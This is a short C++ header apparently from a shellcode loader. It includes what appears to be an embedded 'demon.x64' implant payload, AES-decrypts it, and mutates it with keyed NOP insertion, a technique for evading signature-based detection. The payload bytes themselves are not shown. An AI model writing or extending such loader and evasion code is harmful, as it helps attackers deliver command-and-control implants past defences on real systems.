#pragma once

#include<vector>
#include<string>
#include<cstdint>
#include"demon.x64.h"
#include "ShellcodeMutator.h"
#include "Decrypt.h"

extern const std::string key;

std::vector<uint8_t> mutate()
{
	std::vector<uint8_t> dshellcode = AESDecrypt(shellcode, aesKey);

	ShellcodeMutator mutation(dshellcode); 

	mutation.add_nops(5, key); 

	return mutation.get_shellcode(); 
}